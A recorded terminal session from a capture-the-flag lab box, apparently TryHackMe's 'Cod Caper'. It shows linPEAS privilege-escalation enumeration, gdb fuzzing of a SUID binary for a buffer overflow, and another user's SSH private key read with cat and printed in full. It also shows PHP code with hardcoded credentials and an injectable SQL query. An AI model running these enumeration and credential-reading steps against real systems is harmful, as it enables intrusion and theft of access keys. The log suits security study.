[1;33m[+] [1;32mReadable files belonging to root and readable by me but not world readable
[0m
[1;33m[+] [1;32mModified interesting files in the last 5mins (limit 100)
[0m/var/log/syslog
/var/log/auth.log
/var/log/kern.log

[1;33m[+] [1;32mWritable log files (logrotten) (limit 100)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
[0m
[1;33m[+] [1;32mFiles inside /home/www-data (limit 20)
[0m
[1;33m[+] [1;32mFiles inside others home (limit 20)
[0m/home/papa/.bash_history
/home/papa/.bash_logout
/home/papa/.profile
/home/papa/.bashrc
/home/papa/.sudo_as_admin_successful
/home/papa/.pwntools-cache-2.7/update
/home/pingu/.gdbinit
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/home/pingu/.gdb_history
/home/pingu/.pwntools-cache-2.7/update

[1;33m[+] [1;32mSearching installed mail applications
[0m
[1;33m[+] [1;32mMails (limit 50)
[0m
[1;33m[+] [1;32mBackup folders
[0mls: cannot access '': No such file or directory

[1;33m[+] [1;32mBackup files
[0m-rw-r--r-- 1 root root 190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config[1;31m.old[0m
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/wm831x/[1;31mbackup[0m.h
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/net/team/mode/active[1;31mbackup[0m.h
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvm[1;31mbackup[0m.so
-rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-how.page
-rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-thinkabout.page
-rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-check.page
-rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-frequency.page
-rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-where.page
-rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-what.page
-rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-restore.page
-rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/[1;31mbackup[0m-why.page
-rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-how.page
-rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-thinkabout.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-check.page
-rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-frequency.page
-rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-where.page
-rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-what.page
-rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-restore.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/[1;31mbackup[0m-why.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/[1;31mbackup[0m-auto.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/[1;31mbackup[0m-first.page
-rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/[1;31mbackup[0m-restore.page
-rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-how.page
-rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-thinkabout.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-check.page
-rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-frequency.page
-rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-where.page
-rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-what.page
-rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-restore.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/[1;31mbackup[0m-why.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/[1;31mbackup[0m-auto.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/[1;31mbackup[0m-first.page
-rw-r--r-- 1 root root 10464 Jan 15  2020 /usr/share/info/dir[1;31m.old[0m
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet[1;31m.old[0m.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes[1;31m.old[0m.gz
-rw-r--r-- 1 root root 9070 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/net/team/team_mode_active[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 9038 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/power/wm831x_[1;31mbackup[0m.ko
-rw-r--r-- 1 root root 3020 Jan 15  2020 /etc/apt/sources[1;31m.bak[0m
-rw-r--r-- 1 root root 610 Jan 15  2020 /etc/xml/catalog[1;31m.old[0m
-rw-r--r-- 1 root root 673 Jan 15  2020 /etc/xml/xml-core.xml[1;31m.old[0m
-rw-r--r-- 1 root root 128 Jan 15  2020 /var/lib/sgml-base/supercatalog[1;31m.old[0m

[1;33m[+] [1;32mSearching tables inside readable .db/.sql/.sqlite files (limit 100)
[0m
[1;33m[+] [1;32mWeb files?(output limit)
[0m/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Jan 15  2020 .
drwxr-xr-x 13 root root 4.0K Jan 15  2020 ..
drwxr-xr-x  2 root root 4.0K Jan 16  2020 html

/var/www/html:
total 28K
drwxr-xr-x 2 root root 4.0K Jan 16  2020 .
drwxr-xr-x 3 root root 4.0K Jan 15  2020 ..

[1;33m[+] [1;32mReadable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
[0m
[1;33m[+] [1;32mAll hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
[0m
[1;33m[+] [1;32mReadable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
[0m-rwxr-xr-x 1 www-data www-data 325334 Apr  3 09:32 /tmp/linpeas.sh

[1;33m[+] [1;32mInteresting writable files owned by me or writable by everyone (not in Home) (max 500)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
[0m/dev/mqueue
/dev/shm
/home/pingu
/home/pingu/.cache
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.nano
/home/pingu/.pwntools-cache-2.7
/home/pingu/.pwntools-cache-2.7/update
/home/pingu/.ssh
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/opt
/opt/secret
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
[3m#)You_can_write_even_more_files_inside_last_directory
[0m/var/cache/apache2/mod_cache_disk
/var/hidden/pass
/var[1;31m/lib/[0mphp/sessions
/var/tmp

[1;33m[+] [1;32mInteresting GROUP writable files (not in Home) (max 500)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
[0m  Group [1;32mwww-data:
[0m

[1;33m[+] [1;32mSearching passwords in config PHP files
[0m
[1;33m[+] [1;32mChecking for TTY (sudo/su) passwords in audit logs
[0m
[1;33m[+] [1;32mFinding IPs inside logs (limit 70)
[0m     72 /var/log/dpkg.log:1.16.04.1
     15 /var/log/dpkg.log:3.16.04.4
     14 /var/log/dpkg.log:1.16.04.4
     11 /var/log/dpkg.log:6.16.04.1
      9 /var/log/dpkg.log:2.16.04.2
      9 /var/log/apt/history.log:1.16.04.1
      8 /var/log/dpkg.log:1.7.3.1
      5 /var/log/installer/status:1.16.04.1
      4 /var/log/installer/status:1.2.3.3
      3 /var/log/wtmp:192.168.124.1
      2 /var/log/apt/history.log:1.16.04.4
      1 /var/log/installer/status:2.21.63.9
      1 /var/log/apt/history.log:6.16.04.1
      1 /var/log/apt/history.log:3.16.04.4
      1 /var/log/apt/history.log:2.16.04.2
      1 /var/log/apt/history.log:1.7.3.1

[1;33m[+] [1;32mFinding passwords inside logs (limit 70)
[0m/var/log/bootstrap.log: base-[1;31mpassw[0md depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-[1;31mpassw[0md depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-[1;31mpassw[0md_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../[1;31mpassw[0md_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-[1;31mpassw[0md.
/var/log/bootstrap.log:Selecting previously unselected package [1;31mpassw[0md.
/var/log/bootstrap.log:Setting up base-[1;31mpassw[0md (3.5.39) ...
/var/log/bootstrap.log:Setting up [1;31mpassw[0md (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow [1;31mpassw[0mords are now on.
/var/log/bootstrap.log:Unpacking base-[1;31mpassw[0md (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-[1;31mpassw[0md (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking [1;31mpassw[0md (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-[1;31mpassw[0md: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log:2019-02-26 23:58:11 configure base-[1;31mpassw[0md:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 install base-[1;31mpassw[0md:amd64 <none> 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status half-configured base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status half-installed base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status installed base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:11 status unpacked base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status half-configured base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status half-installed base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 status unpacked base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:13 upgrade base-[1;31mpassw[0md:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:19 install [1;31mpassw[0md:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:19 status half-installed [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:19 status unpacked [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:22 configure base-[1;31mpassw[0md:amd64 3.5.39 <none>
/var/log/dpkg.log:2019-02-26 23:58:22 status half-configured base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:22 status installed base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:22 status unpacked base-[1;31mpassw[0md:amd64 3.5.39
/var/log/dpkg.log:2019-02-26 23:58:28 configure [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log:2019-02-26 23:58:28 status half-configured [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:28 status installed [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:58:28 status unpacked [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status half-configured [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status half-installed [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2019-02-26 23:59:08 status unpacked [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:08 upgrade [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 configure [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5.3 <none>
/var/log/dpkg.log:2019-02-26 23:59:09 status half-configured [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 status installed [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2019-02-26 23:59:09 status unpacked [1;31mpassw[0md:amd64 1:4.2-3.1ubuntu5.3
/var/log/installer/status:Description: Set up users and [1;31mpassw[0mords

[1;33m[+] [1;32mFinding emails inside logs (limit 70)
[0m[1;32m     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com[0m
[1;32m     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com[0m
[1;32m     17 /var/log/installer/status:kernel-team@lists.ubuntu.com[0m
[1;32m      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com[0m

[1;33m[+] [1;32mFinding *password* or *credential* files in home (limit 70)
[0m
[1;33m[+] [1;32mFinding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - only PHP files
[0m/var/www/html/administrator.php:    $[1;31mpassw[0mord = "root";
/var/www/html/administrator.php:    $[1;31mpassw[0mord = $_REQUEST['[1;31mpassw[0mord'];
/var/www/html/administrator.php:    <p>[1;31mPassw[0mord:  </p><input type="text" name="[1;31mpassw[0mord">
/var/www/html/administrator.php:    if($_REQUEST['username'] == 'pingudad' && $_REQUEST['[1;31mpassw[0mord'] == 'secretpass'){

[1;33m[+] [1;32mFinding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70) - no PHP files
[0m/etc/apache2/sites-available/default-ssl.conf:		#	 file needs this [1;31mpassw[0mord: `xxj31ZMTZzkVA'.
/etc/bash_completion.d/grub:__grub_mk[1;31mpassw[0md_pbkdf2_program="grub-mk[1;31mpassw[0md-pbkdf2"
/etc/debconf.conf:#Bind[1;31mPassw[0md: secret
/etc/nsswitch.conf:[1;31mpassw[0md:         compat
/etc/pam.d/common-[1;31mpassw[0mord:[1;31mpassw[0mord	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$[1;31mpassw[0md" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$[1;31mpassw[0md" | cut -f6 -d":")
/etc/security/namespace.init:        [1;31mpassw[0md=$(getent [1;31mpassw[0md "$user")
/etc/ssl/openssl.cnf:# input_[1;31mpassw[0mord = secret
/etc/ssl/openssl.cnf:# output_[1;31mpassw[0mord = secret
/etc/ssl/openssl.cnf:challenge[1;31mPassw[0mord		= A challenge [1;31mpassw[0mord
/etc/ssl/openssl.cnf:challenge[1;31mPassw[0mord_max		= 20
/etc/ssl/openssl.cnf:challenge[1;31mPassw[0mord_min		= 4
/etc/vmware-tools/vm-support:         sed 's/[1;31mpassw[0mord[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/[1;31mpassw[0mord  xxxxxx/g' > \

[1;33m[+] [1;32mFinding possible password variables inside key folders (limit 140)
[0m
[1;33m[+] [1;32mFinding possible password in config files
[0m[3m /etc/adduser.conf[0m
[1;31mpassw[0md
[3m /etc/init/passwd.conf[0m
[1;31mpassw[0md - clear locks on [1;31mpassw[0md and related files
[1;31mpassw[0md to avoid million duplicate bug reports
[1;31mpassw[0md locks"
[1;31mpassw[0md.lock /etc/group.lock /etc/subuid.lock /etc/subgid.lock
[3m /etc/sysctl.d/10-ptrace.conf[0m
[1;31mcreden[0mtials that exist in memory (re-using existing SSH connections,
[3m /etc/debconf.conf[0m
[1;31mpassw[0mords.
[1;31mpassw[0mord
[1;31mpassw[0mords.
[1;31mpassw[0mords
[1;31mpassw[0mord
[1;31mpassw[0mords.dat
[1;31mpassw[0mords and one for everything else.
[1;31mpassw[0mords
[1;31mpassw[0mord is really
[1;31mPassw[0md: secret
[3m /etc/nsswitch.conf[0m
[1;31mpassw[0md:         compat
[3m /etc/apache2/apache2.conf[0m
[1;31mpassw[0md files from being

[1;33m[+] [1;32mFinding 'username' string inside key folders (limit 70)
[0m/var/www/html/administrator.php:    $sql= "Select * from users where [1;31musername[0m = '".$[1;31musername[0m."'";
/var/www/html/administrator.php:    $[1;31musername[0m = "root";
/var/www/html/administrator.php:    $[1;31musername[0m = $_REQUEST['[1;31musername[0m'];
/var/www/html/administrator.php:    <p>[1;31mUsername[0m:  </p><input type="text" name="[1;31musername[0m">
/var/www/html/administrator.php:    if($_REQUEST['[1;31musername[0m'] == 'pingudad' && $_REQUEST['password'] == 'secretpass'){

[1;33m[+] [1;32mSearching specific hashes inside files - less false positives (limit 70)
[0m
www-data@ubuntu:/tmp$ ls -la /opt/secret/root
-r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
www-data@ubuntu:/tmp$ gdb /opt/secret/root
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
(gdb) r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
(gdb) cyclic -l 0x6161616c
Undefined command: "cyclic".  Try "help".
(gdb) cyclic -l 0x6161616c
Undefined command: "cyclic".  Try "help".
(gdb) r < <(cyclic 50)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/secret/root < <(cyclic 50)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
(gdb) cyclic -l 0x6161616c
Undefined command: "cyclic".  Try "help".
(gdb) help
List of classes of commands:

aliases -- Aliases of other commands
breakpoints -- Making program stop at certain points
data -- Examining data
files -- Specifying and examining files
internals -- Maintenance commands
obscure -- Obscure features
running -- Running the program
stack -- Examining the stack
status -- Status inquiries
support -- Support facilities
tracepoints -- Tracing of program execution without stopping the program
user-defined -- User-defined commands

Type "help" followed by a class name for a list of commands in that class.
Type "help all" for the list of all commands.
Type "help" followed by command name for full documentation.
Type "apropos word" to search for commands related to "word".
Command name abbreviations are allowed if unambiguous.
(gdb) Quit
(gdb) Quit
(gdb) quit
A debugging session is active.

	Inferior 1 [process 13937] will be killed.

Quit anyway? (y or n) y
www-data@ubuntu:/tmp$ cd /home/pingu/
www-data@ubuntu:/home/pingu$ ls -la
total 32
drwxrwxrwx 6 pingu pingu 4096 Jan 20  2020 .
drwxr-xr-x 4 root  root  4096 Jan 15  2020 ..
lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 .bash_history -> /dev/null
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .cache
-rw------- 1 pingu pingu 1852 Jan 20  2020 .gdb_history
-rw-r--r-- 1 root  root    36 Jan 16  2020 .gdbinit
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .nano
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .pwntools-cache-2.7
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .ssh
www-data@ubuntu:/home/pingu$ cd .ssh/
www-data@ubuntu:/home/pingu/.ssh$ ls
id_rsa	id_rsa.pub
www-data@ubuntu:/home/pingu/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----
www-data@ubuntu:/home/pingu/.ssh$ exit
exit
www-data@ubuntu:/var/www/html$ exit
exit
]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ exit

Script done on 2021-04-03 22:30:58+05:30 [COMMAND_EXIT_CODE="0"]
